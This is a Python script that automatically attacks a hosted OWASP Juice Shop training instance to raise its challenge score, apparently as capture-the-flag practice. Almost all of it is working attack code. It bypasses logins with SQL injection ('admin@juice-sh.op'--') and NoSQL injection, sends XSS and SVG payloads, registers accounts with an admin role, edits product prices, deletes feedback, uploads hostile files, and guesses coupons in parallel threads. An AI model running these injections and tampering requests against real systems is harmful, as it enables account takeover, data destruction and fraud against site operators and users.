#!/usr/bin/env python3
"""
Brute Force Solver - Try every possible approach to break through
"""

import requests
from urllib.parse import quote
import base64
import json
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


class BruteForceSolver:
    """Brute force approach to solving challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.sessions = []
        
        # Create multiple sessions
        for i in range(5):
            s = requests.Session()
            r = s.post(f"{base_url}/rest/user/login", json={
                "email": "admin@juice-sh.op'--",
                "password": "x"
            })
            if r.status_code == 200:
                token = r.json()['authentication']['token']
                s.headers['Authorization'] = f'Bearer {token}'
                self.sessions.append(s)
                
        if self.sessions:
            print(f"✅ Created {len(self.sessions)} authenticated sessions")
            
    def parallel_attack(self, func, iterations=10):
        """Run function in parallel with multiple sessions"""
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for i in range(iterations):
                session = self.sessions[i % len(self.sessions)]
                futures.append(executor.submit(func, session, i))
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=2)
                except:
                    pass
                    
    def xss_variations(self, session, index):
        """Try XSS with variations"""
        payloads = [
            f"<script>alert({index})</script>",
            f"<img src=x onerror=alert({index})>",
            f"<svg onload=alert({index})>",
            f"<iframe src='javascript:alert({index})'>",
            f"<body onload=alert({index})>",
            f"<<SCRIPT>alert({index})//<</SCRIPT>",
            f"';alert({index});//",
            f'";alert({index});//',
        ]
        
        for payload in payloads:
            session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            session.get(f"{self.base_url}/track-result?id={quote(payload)}")
            
    def sql_injection_variations(self, session, index):
        """SQL injection variations"""
        queries = [
            f"' OR '1'='1'--",
            f"' UNION SELECT * FROM Users--",
            f"admin' OR '1'='1",
            f"' OR 1=1--",
            f"' UNION SELECT {index}, email, password FROM Users--",
        ]
        
        for query in queries:
            session.get(f"{self.base_url}/rest/products/search?q={query}")
            session.post(f"{self.base_url}/rest/user/login", json={
                "email": f"{query}",
                "password": "x"
            })
            
    def file_access_attempts(self, session, index):
        """Try to access various files"""
        files = [
            "/ftp/acquisitions.md",
            "/ftp/eastere.gg",
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            f"/ftp/file{index}.txt",
            "/.well-known/security.txt",
            "/robots.txt",
            "/sitemap.xml",
            f"/api/Users/{index}",
            f"/rest/basket/{index}",
        ]
        
        for file in files:
            session.get(f"{self.base_url}{file}")
            
    def registration_attempts(self, session, index):
        """Try various registrations"""
        emails = [
            f"test{index}@test.com",
            f"admin{index}@test.com",
            f"user{index}@juice-sh.op",
        ]
        
        for email in emails:
            session.post(f"{self.base_url}/api/Users", json={
                "email": email,
                "password": "test123",
                "passwordRepeat": "test123",
                "securityQuestion": {"id": index % 5 + 1},
                "securityAnswer": "test",
                "role": "admin" if index % 2 == 0 else "customer"
            })
            
    def feedback_manipulation(self, session, index):
        """Manipulate feedbacks"""
        # Post feedback
        session.post(f"{self.base_url}/api/Feedbacks", json={
            "comment": f"Test feedback {index}",
            "rating": index % 5 + 1,
            "captcha": str(index),
            "captchaId": index,
            "UserId": index % 10 + 1
        })
        
        # Delete feedbacks
        try:
            r = session.get(f"{self.base_url}/api/Feedbacks")
            if r.status_code == 200:
                for fb in r.json().get('data', [])[:2]:
                    session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
        except:
            pass
            
    def product_manipulation(self, session, index):
        """Manipulate products and baskets"""
        # Update products
        session.put(f"{self.base_url}/api/Products/{index % 20 + 1}", json={
            "description": f"MODIFIED {index}",
            "price": 0.01
        })
        
        # Add to basket with weird quantities
        session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": index % 20 + 1,
            "quantity": -10 if index % 2 == 0 else 100
        })
        
    def authentication_attempts(self, session, index):
        """Try various authentication methods"""
        users = [
            ("admin@juice-sh.op", "admin123"),
            ("jim@juice-sh.op'--", "x"),
            ("bender@juice-sh.op'--", "x"),
            ("amy@juice-sh.op", "K1f....................."),
            ("mc.safesearch@juice-sh.op", "Mr. N00dles"),
            (f"user{index}@juice-sh.op", "password"),
        ]
        
        for email, password in users:
            session.post(f"{self.base_url}/rest/user/login", json={
                "email": email,
                "password": password
            })
            
    def upload_attempts(self, session, index):
        """Try various file uploads"""
        files = [
            ("test.xml", b"<xml>test</xml>", "text/xml"),
            ("test.pdf", b"%PDF-1.4", "application/pdf"),
            ("test.exe", b"MZ", "application/x-msdownload"),
            (f"large{index}.txt", b"A" * 100000, "text/plain"),
            ("xss.svg", b"<svg onload=alert(1)>", "image/svg+xml"),
        ]
        
        for filename, content, mime in files:
            try:
                session.post(f"{self.base_url}/file-upload", 
                           files={"file": (filename, content, mime)},
                           timeout=2)
            except:
                pass
                
    def coupon_attempts(self, session, index):
        """Try various coupons"""
        coupons = [
            "WMNSDY2019", "WMNSDY2020", "CYBER2019",
            f"COUPON{index}", "FREE", "DISCOUNT50"
        ]
        
        for coupon in coupons:
            session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
            
    def nosql_attempts(self, session, index):
        """NoSQL injection attempts"""
        payloads = [
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"$where": f"sleep({index * 100})"},
        ]
        
        for payload in payloads:
            try:
                session.post(f"{self.base_url}/rest/user/login", 
                           json=payload, timeout=1)
            except:
                pass
                
    def run_brute_force(self):
        """Run all brute force attempts"""
        print("="*60)
        print("💪 BRUTE FORCE SOLVER")
        print("="*60)
        
        if not self.sessions:
            print("❌ No authenticated sessions")
            return
            
        print("\n🔨 Starting brute force attacks...")
        
        # Run all attack types in parallel
        attacks = [
            self.xss_variations,
            self.sql_injection_variations,
            self.file_access_attempts,
            self.registration_attempts,
            self.feedback_manipulation,
            self.product_manipulation,
            self.authentication_attempts,
            self.upload_attempts,
            self.coupon_attempts,
            self.nosql_attempts,
        ]
        
        for i, attack in enumerate(attacks, 1):
            print(f"  Attack {i}/{len(attacks)}: {attack.__name__}")
            self.parallel_attack(attack, iterations=20)
            
        # Check score
        print("\n" + "="*60)
        session = self.sessions[0]
        r = session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            
            print(f"📊 SCORE AFTER BRUTE FORCE: {solved}/{total} ({solved*100//total}%)")
            
            if solved >= 55:
                print("🎉 SUCCESS! REACHED 50%!")
            else:
                print(f"📈 Need {55 - solved} more challenges")
                
        print("="*60)


if __name__ == "__main__":
    solver = BruteForceSolver()
    solver.run_brute_force()